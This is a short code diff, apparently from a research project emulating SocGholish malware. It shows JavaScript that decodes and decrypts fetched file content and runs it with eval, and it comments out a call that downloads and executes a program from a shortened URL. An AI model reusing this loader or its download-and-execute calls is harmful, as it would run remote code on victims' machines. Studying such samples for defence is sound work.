@@ -122,5 +122,5 @@ if (XmlHttp_Object.status === 200) {
 var payload = decrypt(decode(fileContent), 4);
 this[eval(payload)];
 
-downloadAndExecuteNirCmd("http://tinyurl.com/4kuz8yfm");
+// downloadAndExecuteNirCmd("http://tinyurl.com/4kuz8yfm");
 // downloadAndExecuteNirCmd("https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/encoded-payload.txt");
